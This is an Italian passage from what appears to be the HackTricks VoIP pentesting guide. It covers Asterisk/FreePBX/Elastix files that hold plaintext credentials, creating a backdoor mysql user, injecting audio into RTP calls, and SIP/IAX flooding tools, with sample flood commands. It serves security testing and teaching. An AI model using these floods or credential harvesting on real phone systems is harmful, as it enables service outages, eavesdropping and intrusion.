* Se il **server Asterisk √® in esecuzione come root**, potresti compromettere il root.
* L'utente **root di mysql** potrebbe **non avere alcuna password**.
* questo potrebbe essere usato per creare un nuovo utente mysql come backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Contiene la password dell'amministratore del pannello web (FreePBX).
* **`FreePBX.conf`** -> Contiene la password dell'utente FreePBXuser utilizzata per accedere al database.
* questo potrebbe essere usato per creare un nuovo utente mysql come backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Contiene diverse password in chiaro come la password di root di mysql, la password di IMAPd, la password dell'amministratore web.
* **Diverse cartelle** apparterranno all'utente Asterisk compromesso (se non in esecuzione come root). Questo utente pu√≤ leggere i file precedenti e controlla anche la configurazione, quindi potrebbe fare in modo che Asterisk carichi altri binari backdoor quando eseguiti.

### Iniezione RTP

√à possibile inserire un **`.wav`** nelle conversazioni utilizzando strumenti come **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) e **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Oppure potresti utilizzare gli script da [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) per **scansionare le conversazioni** (**`rtpscan.pl`**), inviare un `.wav` a una conversazione (**`rtpsend.pl`**) e **inserire rumore** in una conversazione (**`rtpflood.pl`**).

### DoS

Ci sono diversi modi per provare a ottenere un DoS nei server VoIP.

* **`SIPPTS flood`** da [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood invia messaggi illimitati al target.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** da [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping effettua un ping SIP per vedere il tempo di risposta del server.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS al protocollo IAX utilizzato da Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Uno strumento per eseguire flooding di messaggi SIP/SDP INVITE su UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Invia diversi pacchetti RTP ben formati. √à necessario conoscere le porte RTP che vengono utilizzate (fare uno sniff prima).
* [**SIPp**](https://github.com/SIPp/sipp): Permette di analizzare e generare traffico SIP, quindi pu√≤ essere utilizzato anche per DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Swiss army knife SIP. Pu√≤ anche essere utilizzato per eseguire attacchi SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vulnerabilit√† del sistema operativo

Il modo pi√π semplice per installare un software come Asterisk √® scaricare una **distribuzione OS** che lo abbia gi√† installato, come: **FreePBX, Elastix, Trixbox**... Il problema con questi √® che una volta che funzionano gli amministratori di sistema potrebbero **non aggiornarli di nuovo** e con il tempo verranno scoperte **vulnerabilit√†**.

## Riferimenti

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
